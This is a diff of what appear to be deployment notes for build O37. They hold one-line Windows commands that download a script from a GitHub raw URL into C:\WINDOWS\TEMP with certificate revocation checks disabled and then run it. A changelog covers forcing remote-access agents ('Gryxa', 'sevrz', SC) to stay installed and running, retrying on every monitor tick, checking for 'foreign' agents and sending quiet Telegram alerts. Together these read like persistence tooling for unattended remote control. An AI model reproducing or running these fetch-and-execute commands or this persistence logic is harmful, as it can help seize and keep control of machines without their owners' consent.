@@ -1,15 +1,20 @@
-UNIVERSAL DEPLOY (O36 / M26 — gryxa MUST-RUN):
+UNIVERSAL DEPLOY (O37 / M27 / S8 — Gryxa offline fix):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o36" & findstr /C:"OWN BUILD 20260802O36" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o37" & findstr /C:"OWN BUILD 20260802O37" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-If main raw lags, use SHA pin:
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/60671350ec51a2ae67909f0d25be3bedf608a024/own.txt" & findstr /C:"OWN BUILD 20260802O36" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+SHA-pin (if main raw lags):
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/SHA/own.txt" & findstr /C:"OWN BUILD 20260802O37" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-O36:
-- Gryxa FP 9908198e668e4750 is MUST-RUN (not soft-keep):
-  start → /fa repair → orphan clean → fresh /i (even if registered-stuck) →
-  start x3 + failure=restart until RUNNING. Every mon tick retries.
-- Quiet TG unchanged when prim+gryxa OK + no foreign.
-- Keeps: sevrz 5f6010579852e507 + alt f861c8140d453427 + gryxa 9908198e668e4750
+O37 root cause:
+- Sevrz + Gryxa MSIs share legacy UpgradeCodes {0C94448B…}/{1F85D7FE…}.
+  msiexec /i of sevrz can knock Gryxa offline in the panel.
+- Prior builds LockDir'd SC install dirs → client cannot write → panel OFFLINE
+  while service still shows Running.
 
-Expect: Source O36 | MON=M26 | Gryxa Running [KEEP-GRYXA]
+O37 fixes:
+- Refuse sevrz /i when Gryxa registered/present; /fa only + protect alert.
+- After any sevrz /i, immediately EnsureGryxaMust.
+- Gryxa heal: start → /fa → clean /x+/i (never /i over registered).
+- Unlock previously LockDir'd SC dirs; never LockDir SC again.
+
+Expect: Source O37 | MON=M27 | SEC=S8 | Gryxa stays online in panel.
